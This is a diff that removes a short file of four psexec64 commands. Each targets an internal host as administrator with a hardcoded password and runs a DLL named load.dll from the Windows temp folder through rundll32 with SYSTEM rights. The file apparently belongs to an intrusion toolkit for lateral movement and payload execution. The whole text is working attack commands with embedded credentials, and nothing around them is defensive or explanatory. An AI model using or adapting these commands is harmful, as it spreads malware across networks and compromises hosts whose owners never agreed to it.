@@ -1,9 +1,0 @@
-psexec64 \\192.168.44.150 -u administrator -p 1qaz@WSX  -i -s -d cmd /c rundll32 c:\windows\temp\load.dll update
-
-
-psexec64 \\192.168.3.5 -u administrator -p 1qaz@WSX  -i -s -d cmd /c rundll32 c:\windows\temp\load.dll update
-
-
-psexec64 \\192.168.44.146 -u administrator -p 1qaz@WSX  -i -s -d cmd /c rundll32 c:\windows\temp\load.dll update
-
-psexec64 \\192.168.44.131 -u administrator -p 123456  -i -s -d cmd /c rundll32 c:\windows\temp\load.dll update
